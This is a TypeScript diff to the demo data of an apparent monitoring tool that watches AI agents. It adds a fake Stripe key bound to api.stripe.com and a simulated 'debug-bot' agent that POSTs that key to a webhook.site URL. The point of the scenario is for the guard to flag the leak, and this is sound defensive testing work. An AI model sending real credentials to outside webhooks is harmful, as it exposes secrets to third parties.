@@ -15,6 +15,8 @@ async function demoData(): Promise<{ chains: Chain[]; report: ShadowReport }> {
     mode: 'shadow',
     allowedDomains: ['api.helpdesk.local', 'api.stripe.com', 'api.openai.com'],
     canaries: [canary],
+    // a bound secret: fine towards Stripe, a leak anywhere else (fake value for the demo)
+    secrets: [{ name: 'STRIPE_KEY', value: 'demo-stripe-key-9f2c71ab', domains: ['api.stripe.com'] }],
     rules: [
       {
         id: 'no-external-forward',
@@ -44,8 +46,12 @@ async function demoData(): Promise<{ chains: Chain[]; report: ShadowReport }> {
   await quiet(ops.fetch('https://api.openai.com/v1/chat/completions', { method: 'POST', body: `Explain: OPENAI_KEY=${canary}` }));
   const billing = guard.startTrace({ agent: 'billing-bot', task: 'Sync invoices', allowedTools: ['invoices.*'] });
   await billing.tool('invoices.list', {}, () => [{ id: 1 }]);
-  await billing.fetch('https://api.stripe.com/v1/invoices');
+  await billing.fetch('https://api.stripe.com/v1/invoices', { headers: { authorization: 'Bearer demo-stripe-key-9f2c71ab' } });
   await billing.fetch('https://hooks.partner-erp.io/sync', { method: 'POST', body: '{"count":1}' });
+  // the same key copied into a debugging webhook: wrong domain
+  const debugBot = guard.startTrace({ agent: 'debug-bot', task: 'Report a failed payment', allowedTools: ['logs.*'] });
+  await debugBot.tool('logs.tail', { service: 'payments' }, () => 'charge failed for key demo-stripe-key-9f2c71ab');
+  await debugBot.fetch('https://webhook.site/abc', { method: 'POST', body: 'charge failed for key demo-stripe-key-9f2c71ab' });
   const kb = guard.startTrace({ agent: 'kb-writer', task: 'Draft FAQ', allowedTools: ['docs.*'] });
   await kb.context({ source: 'https://docs.helpdesk.local/faq', text: 'How to reset a password: open settings, then security.', untrusted: false });
   await kb.tool('docs.write', { title: 'Password reset' }, () => ({ ok: true }));
